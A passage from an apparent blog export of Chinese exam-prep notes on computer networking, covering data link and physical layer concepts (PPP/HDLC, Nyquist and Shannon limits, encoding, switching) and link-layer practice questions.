</li>
<li><strong>局域网</strong><ul>
<li>协议位于<strong>数据链路层、物理层</strong></li>
<li>强调数据传输</li>
<li>采用多点接入模式</li>
</ul>
</li>
</ul>
<h3 id="两种协议"><a href="#两种协议" class="headerlink" title="两种协议"></a>两种协议</h3><p>具体看这个：<a href="https://www.jianshu.com/p/003ccda4ebee">https://www.jianshu.com/p/003ccda4ebee</a></p>
<ul>
<li><strong>PPP协议</strong><ul>
<li>面向字节</li>
<li>有2B的协议字段</li>
<li>无序号和确认机制</li>
<li>不可靠</li>
</ul>
</li>
<li><strong>HDLC协议</strong><ul>
<li>面向比特</li>
<li>通过控制字段标志协议</li>
<li>有序号和确认机制</li>
<li>可靠</li>
</ul>
</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673187151748.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673187164281.png"></p>
<h2 id="数据链路层设备"><a href="#数据链路层设备" class="headerlink" title="数据链路层设备"></a>数据链路层设备</h2><h3 id="物理层扩展以太网"><a href="#物理层扩展以太网" class="headerlink" title="物理层扩展以太网"></a>物理层扩展以太网</h3><ul>
<li>使用光纤连接使得传输距离更远</li>
<li>使用集线器将多台设备组成一个冲突域</li>
<li>使用主干集线器连接多个冲突域形成更大的冲突域</li>
</ul>
<p><strong>冲突域</strong>：连接在同一个物理层设备上的电脑中，同时只能有一台电脑进行通信，成为一个冲突域</p>
<p>主要使用的设备有：<strong>网桥和交换机</strong><br>看这个：<a href="https://www.cnblogs.com/sddai/p/5399480.html">https://www.cnblogs.com/sddai/p/5399480.html</a></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673187190752.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673187208552.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673186551607.png"></p>
<hr>
<blockquote>
<p><strong>写在最后</strong>：这一层的知识很多，因为涉及的领域很广，不像网络层、传输层等专注于某几个特定协议。对于数据链路层的学习，需要掌握其主要的功能：差错控制、流量控制、介质访问控制等，要知道其中实现的具体方法、几种功能的不同之处。同时还要对局域网、广域网、使用的设备等进行了解。</p>
</blockquote>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始的计网学习-物理层</title>
    <url>/2023/01/06/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0-%E7%89%A9%E7%90%86%E5%B1%82/</url>
    <content><![CDATA[<blockquote>
<p>写在最前面：本篇文章的主要资料来源为<code>《[公众号蓝蓝考研]计算机网络背诵版》</code>，同时会在遇到重点问题时广泛收集网上资料，使得记录更加详细。本次整理仅用于个人学习。</p>
</blockquote>
<hr>
<p>老规矩，先来说一下<strong>本节考点</strong>：</p>
<ul>
<li>定义标准的四大特性</li>
<li><em>奈式准则与香农定理</em></li>
<li>编码与调制</li>
<li>数据交换方式</li>
<li>物理层设备与传输介质</li>
</ul>
<p><strong>考点说明</strong>：各个考点即为下面的小节标题，会分别进行介绍。其中奈式准则与香农定理涉及到计算。</p>
<hr>
<h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>下面会介绍一些重要的<strong>术语定义</strong>，要注意区分与记忆。</p>
<blockquote>
<p>定义标准的四大特性</p>
<blockquote>
<p>这是一个很重要的考点，需要<code>记住这四大特性的特征</code>。</p>
</blockquote>
</blockquote>
<ul>
<li><strong>机械特性</strong>：规定连接时候的规格、接口形状、引线数目、引脚数量等</li>
<li><strong>电气特性</strong>：电压范围、阻抗匹配、传输效率、距离限制</li>
<li><strong>功能特性</strong>：某条线上出现的某一电平代表何种意义</li>
<li><strong>规程特性</strong>：物理线路的工作规程与时序关系</li>
</ul>
<p><strong>注</strong>：简记为“<code>机电功规</code>”。因为是物理层范畴，所以都是与硬件相关的。</p>
<p><strong>实例题目</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672999582984.png"></p>
<blockquote>
<p><strong>数据通信</strong>基础概念</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672919596982.png"><br><strong>注</strong>：这里的几个概念要明确，与信息论学习结合起来。</p>
<blockquote>
<p><strong>速率</strong>与<strong>波特</strong></p>
</blockquote>
<p><strong>提醒</strong>：这是一个很重要的计算题考点，要注意区分这些很类似的概念。</p>
<ul>
<li>码元传输速率 &#x3D; 码元速率 &#x3D; 波形速率 &#x3D; 符号速率 &#x3D; 调制速率 &#x3D; <strong>单位时间内通信系统传输的码元个数</strong></li>
<li>信息传输速率 &#x3D; 信息速率 &#x3D; <strong>比特率</strong>（b&#x2F;s)</li>
<li><strong>波特率</strong> &#x3D; 每秒传输的码元符号的个数</li>
<li>关系：<strong>波特率</strong> &#x3D; <strong>比特率&#x2F;每个码元所含比特数</strong> &#x3D; <strong>信息传输速率&#x2F;每个码元所含比特数</strong></li>
</ul>
<p><strong>提醒</strong>：这里要区分波特率和比特率，具体如下：</p>
<ul>
<li>波特率：是<strong>码元</strong>传输速率单位，他说明单位时间传输了多少个码元。</li>
<li>比特率：是<strong>信息量</strong>传送速率单位，即每秒传输二进制代码位数。bit&#x2F;s</li>
</ul>
<p>可能还不是很清楚，举例说明：</p>
<ul>
<li>如果在数字传输过程中，用0V表示数字0，5V表示数字1，那么<strong>每个码元有两种状态0和1</strong>. 每个码元代表<strong>一个二进制数字</strong>。此时的每秒码元数和每秒二进制代码数是一样的，这叫<strong>两相调制</strong>，<strong>波特率等于比特率</strong>。</li>
<li>如果在数字传输过程中，0V、2V、4V和6V分别表示00、01、10和11，那么<strong>每个码元有四种状态00、01、10和11</strong>. 每个码元代表两个二进制数字。此时的每秒码元数是每秒二进制代码数是一半的，这叫<strong>四相调制</strong>，<strong>波特率等于比特率一半</strong>。</li>
</ul>
<p>两者关系：比特率&#x3D;波特率X单个调制状态对应的二进制位数</p>
<p>一个例子：<code>波特率计算</code><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672920137234.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672999913253.png"></p>
<blockquote>
<p>三大通信方式</p>
</blockquote>
<ul>
<li><strong>单工通信</strong>：一个方向的通信，如无线电广播</li>
<li><strong>半双工通信</strong>：双向交替通信，只是<strong>双方不能同时发送</strong></li>
<li><strong>双工通信</strong>：双方可以同时通信</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672999933285.png"></p>
<blockquote>
<p>两种传输方式</p>
</blockquote>
<ul>
<li><p><strong>串行传输</strong>：按照比特、时间顺序传输</p>
<ul>
<li>速度慢但是费用低，适合<strong>远距离</strong>通信</li>
</ul>
</li>
<li><p><strong>并行传输</strong>：多比特多条通信通道同时传输</p>
<ul>
<li>速度快但是费用高，适合<strong>近距离</strong>通信</li>
</ul>
<p><strong>注</strong>：很好理解，远距离当然选择成本低的。</p>
</li>
</ul>
<h2 id="奈式准则与香农定理"><a href="#奈式准则与香农定理" class="headerlink" title="奈式准则与香农定理"></a>奈式准则与香农定理</h2><blockquote>
<p>奈式准则</p>
</blockquote>
<ul>
<li><strong>理想低通信道</strong>的最高码元传输速率 &#x3D; 2W Baud</li>
<li><strong>理想带通信道</strong>的最高码元传输速率 &#x3D; W Baud</li>
</ul>
<p>其中<strong>W为信道带宽</strong>，<strong>Baud为波特即码元&#x2F;秒</strong></p>
<p><strong>注</strong>：理想低通（<strong>无噪声、带宽受限</strong>），理想带通（<strong>带宽受限、有噪声</strong>）；带宽只有在<strong>奈氏准则和香农定理中</strong>单位是HZ，其余都是b&#x2F;s。</p>
<ul>
<li>理想低通信道的极限数据传输速率 &#x3D; 2W * log2V<br>其中<strong>W是信道带宽</strong>，单位为HZ；<strong>V是码元的离散电平数目</strong>，也就是每一个码元的状态数。</li>
</ul>
<p><strong>注</strong>：由于码元的传输速率受<strong>奈氏准则的制约</strong>，所以要<strong>提高数据的传输速率</strong>，就必须设法使每个码元能携带更多的个比特量的信息，这就需要<strong>多元制的调制方法</strong>。</p>
<blockquote>
<p>香农定理</p>
</blockquote>
<p><em><em>信道的极限数据传输速率 c  &#x3D; W</em> log2(1+S&#x2F;N)</em>*</p>
<p>其中：</p>
<ul>
<li>C：信道的极限数据传输速率</li>
<li>W：信道带宽（HZ）</li>
<li>S：信道内的高斯噪音</li>
<li>S&#x2F;N：信噪比(DB) &#x3D; 10 * log2(1+S&#x2F;N) db</li>
</ul>
<p><strong>注</strong>：  信噪比就是信号的<strong>平均功率和噪声</strong>的平均功率之比，常记于S&#x2F;N，并<strong>用分贝（dB）作为度量单位</strong>。</p>
<blockquote>
<p>奈式公式与香农定理的比较</p>
</blockquote>
<p>奈氏准则指出，<strong>码元传输速率是受限的</strong>；香农定理则给出了<strong>信息传输速率的极限</strong>。也就是说，奈氏准则认为码元编码足够好，就不会限制信息传输速率。</p>
<p>码元传输速率（波特率），是指传输码元的速率。与信息传输速率（比特率）的区别在于，一个码元通过调频调相，可以显示出多种变化，就可以代表多个比特。一般来讲，信息传输速率&#x3D;码元传输速率*log2(码元变化数量)。 - 具体前面已经介绍过</p>
<p>所以其实区别只有一个，那就是<strong>奈氏准则是针对波特率的</strong>，没有限制比特率，他认为码元传输速率一旦确定，再确定码元所载的比特数，极限信息传输速率也就确定了；而香农公式通过极其复杂的推演，得出了结论：<strong>信息传输速率也是有极限的</strong>，且这个极限不是由波特率单独决定，还是由<strong>传输带宽和信噪比决定</strong>的。</p>
<blockquote>
<p>实例题目：主要是的几个相关计算</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672999044126.png"></p>
<p><strong>注意</strong>：使用香农定理时先通过公式由信噪比计算出S&#x2F;N再带入。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672999218107.png"></p>
<p><strong>注意</strong>：只有奈式准则先判断是否有噪声。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672999380680.png"></p>
<p><strong>注意</strong>：这一题是一个易错点，在计算最大数据率时要比较一下香农定理得到的结果与奈式准则的结果，取二者的较小者。</p>
<h2 id="四大编码方式"><a href="#四大编码方式" class="headerlink" title="四大编码方式"></a>四大编码方式</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672922537031.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672922695204.png"></p>
<blockquote>
<p><strong>实例题目</strong>：主要是区分各个编码的画法</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672999004933.png"></p>
<h2 id="编码与调制"><a href="#编码与调制" class="headerlink" title="编码与调制"></a>编码与调制</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672924145595.png"><br><strong>区分一下</strong>：</p>
<p>1、数字信号是<strong>离散</strong>（不连续）的，而模拟信号是<strong>连续</strong>的；<br>2、数字信号只有“0”和“1”<strong>两种状态</strong>，而摸拟信号可以是<strong>任意数值状态</strong>；<br>3、模拟信号是用一系列<strong>连续变化</strong>的电磁波或电压信号来表示，而数字信号是用一系列<strong>断续变化</strong>的电压脉冲或光脉冲来表示。</p>
<blockquote>
<p>扩展一下：模拟数据与数字数据</p>
</blockquote>
<p>不同的数据必须转换为<strong>相应的信号才能进行传输</strong>：</p>
<ul>
<li>模拟数据一般采用<strong>模拟信号</strong>(Analog Signal)，例如用一系列连续变化的电磁波(如无线电与电视广播中的电磁波)，或电压信号(如电话传输中的音频电压信号)来表示；</li>
<li>数字数据则采用<strong>数字信号</strong>(Digital Signal)，例如用一系列断续变化的电压脉冲(如我们可用恒定的正电压表示二进制数1，用恒定的负电压表示二进制数0)，或光脉冲来表示。 </li>
<li>当模拟信号采用连续变化的电磁波来表示时，<strong>电磁波本身</strong>既是信号载体，同时作为传输介质；</li>
<li>而当模拟信号采用连续变化的信号电压来表示时，它一般通过<strong>传统的模拟信号传输线路</strong>(例如电话网、有线电视网)来传输。 </li>
<li>当数字信号采用断续变化的电压或光脉冲来表示时，一般则需要用<strong>双绞线、电缆或光纤介质</strong>将通信双方连接起来，才能将信号从一个节点传到另一个节点。</li>
</ul>
<p>模拟信号和数字信号之间<strong>可以相互转换</strong>：</p>
<ul>
<li>模拟信号一般通过PCM脉码调制(Pulse Code Modulation)方法量化为数字信号，即让模拟信号的不同幅度分别对应不同的二进制值，例如采用8位编码可将模拟信号量化为2^8&#x3D;256个量级，实用中常采取24位或30位编码；</li>
<li>数字信号一般通过对载波进行移相(Phase Shift)的方法转换为模拟信号。 计算机、计算机局域网与城域网中均使用二进制数字信号，目前在计算机广域网中实际传送的则既有二进制数字信号，也有由数字信号转换而得的模拟信号。但是更具应用发展前景的是数字信号。</li>
</ul>
<h2 id="三大交换"><a href="#三大交换" class="headerlink" title="三大交换"></a>三大交换</h2><p>这部分在第一篇文章中已经介绍过了，这里涉及到一些计算和扩展。要知道这<strong>三种不同交换方式的优缺点</strong>。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672922872444.png"><br><strong>注</strong>：电路交换就是建立专线，时延小、无冲突，但是利用率低，成本高。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672922882131.png"><br><strong>注</strong>：报文交换线路利用率高但是时延也高，需要存储转发。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672922891870.png"><br><strong>注</strong>：分组交换是最常见的交换方式。</p>
<p><strong>三者比较如下</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672923103752.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672924100749.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672923168574.png"></p>
<blockquote>
<p><strong>实例题目</strong>：主要是时延的计算，考虑存储转发机制</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672998293596.png"><br><strong>提醒</strong>：这里没有考虑<strong>传输时延和处理分组时延</strong>，只是用到了<strong>发送时延和存储转发时延</strong>。同时是采取分组交换的思想，即只需要考虑第一个分组发送到最后一个分组到达的时间差即可，其中最后一个分组先等待999t，而后耗费3t从H1到H2.</p>
<p><strong>注意</strong>：对于速率的单位换算是10的n次方形式。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672998914764.png"><br><strong>注意</strong>：通过这个题目就可以很明显的看出分组交换和报文交换的区别，前者是并行的，即不同分组可以在同一时间在不同节点进行存储转发；后者是串行的，同一个时间只可以在一个节点进行转发。</p>
<h2 id="传输介质"><a href="#传输介质" class="headerlink" title="传输介质"></a>传输介质</h2><p>传输介质可以分为：<strong>导向性传输介质</strong>和<strong>非导向性传输介质</strong>。</p>
<ul>
<li>导向性：铜线、光纤</li>
<li>非导向性：客气、海水、真空</li>
</ul>
<p>要了解一些常用的传输介质：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672923337374.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672924059053.png"></p>
<p><strong>实例题目：</strong></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672999642872.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672999677843.png"></p>
<h2 id="物理层设备"><a href="#物理层设备" class="headerlink" title="物理层设备"></a>物理层设备</h2><p><strong>物理层的作用</strong>：连接不同的物理设备，传输比特流。该层为上层协议提供了一个传输数据的可靠的物理媒介。简单来说，物理层确保原始的数据可以在各种物理媒介上传输。</p>
<p><strong>物理层使用的设备</strong>：</p>
<ul>
<li><strong>中继器</strong>：放大信号，延长数据传输距离</li>
<li><strong>集线器</strong>：多端口中继器，为多台终端放大信号</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672924029768.png"></p>
<hr>
<blockquote>
<p><strong>写在最后</strong>：物理层在计算机网络中并不是特别重要的部分，所以不需要花费很多时间。主要的易错点就是传输速率与波特率的计算，主要单位、换算，熟记公式即可。</p>
</blockquote>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始的计网学习-链路层习题整理</title>
    <url>/2023/01/10/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0-%E9%93%BE%E8%B7%AF%E5%B1%82%E4%B9%A0%E9%A2%98%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<blockquote>
<p><strong>写在最前面</strong>：本篇文章是计算机网络中数据链路层的习题汇总，会给出问题和答案，但是在看答案之前建议先自己思考一下你的回答，再与答案对比。<br><strong>习题参考</strong>：<a href="https://www.zhihu.com/column/c_1413289786211373056?utm_source=qq&utm_medium=social&utm_oi=1268627816133816320">https://www.zhihu.com/column/c_1413289786211373056?utm_source=qq&amp;utm_medium=social&amp;utm_oi=1268627816133816320</a><br><strong>说明</strong>：会在原习题的基础上加上自己的理解，同时会将原本的题目进行分类，便于学习理解。</p>
</blockquote>
<ul>
<li><a href="#%E4%B8%80%E4%BA%9B%E5%BF%85%E9%A1%BB%E8%A6%81%E6%87%82%E7%9A%84%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A7%A3%E7%AD%94%E6%95%B4%E7%90%86">一些必须要懂的常见问题与解答整理</a></li>
<li><a href="#%E4%B8%80%E4%BA%9B%E5%BF%85%E9%A1%BB%E8%A6%81%E6%87%82%E7%9A%84%E9%87%8D%E9%9A%BE%E7%82%B9%E8%AF%BE%E5%90%8E%E4%B9%A0%E9%A2%98%E6%95%B4%E7%90%86">一些必须要懂的重难点课后习题整理</a><ul>
<li><a href="#%E6%A6%82%E5%BF%B5%E7%90%86%E8%A7%A3%E9%A2%98">概念理解题</a></li>
<li><a href="#%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86%E9%A2%98">协议原理题</a></li>
<li><a href="#%E7%BB%84%E5%B8%A7%E7%B1%BB%E5%9E%8B%E9%A2%98">组帧类型题</a></li>
<li><a href="#%E5%B7%AE%E9%94%99%E6%A3%80%E6%B5%8B%E9%A2%98">差错检测题</a></li>
<li><a href="#%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6%E9%A2%98">流量控制题</a></li>
<li><a href="#%E5%AA%92%E4%BB%8B%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6">媒介访问控制</a></li>
<li><a href="#%E5%B1%80%E5%9F%9F%E7%BD%91%E9%A2%98%E7%9B%AE">局域网题目</a></li>
<li><a href="#%E7%89%A9%E7%90%86%E8%AE%BE%E5%A4%87%E9%A2%98">物理设备题</a></li>
</ul>
</li>
</ul>
<h1 id="一些必须要懂的常见问题与解答整理"><a href="#一些必须要懂的常见问题与解答整理" class="headerlink" title="一些必须要懂的常见问题与解答整理"></a>一些必须要懂的常见问题与解答整理</h1><blockquote>
<p><strong>问题一</strong>：旧版的《计算机网络》认为数据链路层的任务是<strong>在两个相邻结点间的线路上无差错地传送以帧(frame)为单位的数据</strong>。数据链路层可以把一条有可能出差错的实际链路转变成为<strong>让网络层向下看起来好像是一条不出差错的链路</strong>。但最近新版的《计算机网络》中对数据链路层的提法就改变了。数据链路层的传输不能让网络层向下看起来好像是一条不出差错的链路。到底哪一种说法是正确的？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673233903417.png"></p>
<p><strong>我的理解</strong>：二者并没有谁对谁错，只是针对的对象不同。不过我们当然要与时俱进，最好是两者都知道，并可以解释其中差别。</p>
<blockquote>
<p><strong>问题二</strong>：当数据链路层是用<strong>PPP协议或CSMA&#x2F;CD协议</strong>时，既然不保证可靠传输，那么<strong>为什么对所传输的帧进行差错检测呢</strong>？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673234122096.png"></p>
<p><strong>我的理解</strong>：PPP协议或者CSMA&#x2F;CD只是<strong>不实现重发机制</strong>，基础的差错检测功能还是有的。</p>
<blockquote>
<p><strong>问题三</strong>：为什么旧版本的教材在数据链路层一章中讲授可靠传输，但现在<strong>新版本教材则取消了可靠传输？</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673234290730.png"></p>
<p><strong>我的理解</strong>：只是为了适应现实，将其放到真实使用的层次。</p>
<blockquote>
<p><strong>问题四</strong>：除了差错检测外，面向字符的数据链路层协议还必须解决哪些特殊的问题？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673234430056.png"><br><strong>我的理解</strong>：差错检测是判断数据帧是否出错。而数据链路层协议还具备解决<strong>帧界定和透明传输</strong>的功能，其中帧界定有很多方法要记住，而透明传输是在帧界定的基础上提出的要求。</p>
<blockquote>
<p><strong>问题五</strong>：为什么计算机进行通信时<strong>发送缓存和接收缓存</strong>总是需要的？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673234490219.png"></p>
<p><strong>我的理解</strong>：缓冲区的目的就是为了实现发送和接收的同步，协调二者的时间，提高信道利用率。</p>
<blockquote>
<p><strong>问题六</strong>：在以太网中发生了碰撞是否说明这时出现了某种故障？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673234633178.png"></p>
<p><strong>我的理解</strong>：碰撞是一个很常见的现象，不可以作为故障的决定标准。</p>
<blockquote>
<p><strong>问题七</strong>：是什么原因使以太网有一个<strong>最小帧长和最大帧长</strong>？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673234732661.png"></p>
<p><strong>我的理解</strong>：在前面学习数据链路层的相关知识时有过MTU的扩展，那里从<strong>差错检测的角度</strong>给出了最小帧长和最大帧长的原因；这里则是从<strong>介质访问控制的角度</strong>给出，即<strong>过短会导致无法进行冲突检测，同时可以借此去除无效帧，过长则是为了保证接入的公平性，防止长时间等待</strong>。</p>
<blockquote>
<p><strong>问题八</strong>：以太网的覆盖范围受限的一个原因是：如果站点之间的距离太大，那么由于<strong>信号传输时会衰减得很多</strong>因而无法对信号进行可靠的接收。试问：如果我们设法提高发送信号的功率，那么是否就可以增大以太网的通信距离？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673235024434.png"></p>
<p><strong>我的理解</strong>：<strong>决定因素是信噪比</strong>，功率提升噪声也会提升，信噪比不会显著增大。</p>
<blockquote>
<p><strong>问题九</strong>：一个大学能否就使用一个很大的局域网，而不使用许多相互连接的较小的局域网？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673235136843.png"></p>
<blockquote>
<p><strong>问题十</strong>：一个10Mbit&#x2F;s以太网若工作在<strong>全双工状态</strong>，那么其数据率是发送和接收各为5Mbit&#x2F;s还是发送和接收各为10Mbit&#x2F;s。</p>
</blockquote>
<p><strong>答案</strong>：二者都是10Mbps</p>
<blockquote>
<p><strong>问题十一</strong>：在以太网中，有没有可能在发送了512bit(64B)以后才发生碰撞？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673235251420.png"></p>
<blockquote>
<p><strong>问题十二</strong>：当局域网刚刚问世时，<strong>总线型的以太网被认为可靠性比星型结构的网络好</strong>。但现在以太网又回到了星型结构，使用集线器作为交换结点。那么以前的看法是否有些不正确？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673235387231.png"></p>
<p><strong>扩展：星形结构</strong></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673235491017.png"></p>
<p><a href="https://product.pconline.com.cn/itbk/life/electronic/1802/10848376.html">星型网络结构有哪些特点 星型网络结构优缺点介绍</a></p>
<h1 id="一些必须要懂的重难点课后习题整理"><a href="#一些必须要懂的重难点课后习题整理" class="headerlink" title="一些必须要懂的重难点课后习题整理"></a>一些必须要懂的重难点课后习题整理</h1><h2 id="概念理解题"><a href="#概念理解题" class="headerlink" title="概念理解题"></a>概念理解题</h2><blockquote>
<p><strong>数据链路</strong>（即逻辑链路）与<strong>链路</strong>（即物理链路）有何区别？“<strong>电路接通了</strong>”与“<strong>数据链路接通了</strong>”的区别何在？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673235683338.png"><br><strong>我的理解</strong>：物理链路是实际的，是一段传输介质；数据链路是虚拟的，是协议的集合。</p>
<blockquote>
<p>数据链路层中的<strong>链路控制包括哪些功能</strong>？试讨论<strong>把数据链路层做成可靠的链路层有哪些优点和缺点？</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673235956949.png"></p>
<p><strong>我的理解</strong>：上题的答案更加趋向于<strong>MAC子层的功能</strong>。而数据链路层还包含<strong>介质访问控制、流量控制</strong>的功能。同时上文已经说过，现在的数据链路层是不提供可靠性服务的（PPP协议和CSMA&#x2F;CD协议）</p>
<blockquote>
<p>数据链路层的<strong>三个基本问题</strong>（封装成帧、透明传输和差错检测）为什么都必须加以解决？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673236323837.png"></p>
<h2 id="协议原理题"><a href="#协议原理题" class="headerlink" title="协议原理题"></a>协议原理题</h2><blockquote>
<p>PPP协议的主要特点是什么？为什么PPP不使用帧的编号？PPP适用于什么情况？为什么PPP协议不能使数据链路层实现可靠传输？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673236408703.png"></p>
<blockquote>
<p><strong>PPP协议</strong>的工作状态有哪几种？当用户要使用PPP协议和ISP建立连接进行通信时，需要建立哪几种连接？每一种连接解决什么问题？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673237657349.png"></p>
<h2 id="组帧类型题"><a href="#组帧类型题" class="headerlink" title="组帧类型题"></a>组帧类型题</h2><blockquote>
<p>一个PPP帧的数据部分（用十六进制写出）是 7D 5E FE 27 7D 5D 7D 5D 65 7D 5E。试问真正的数据是什么（用十六进制写出）？</p>
</blockquote>
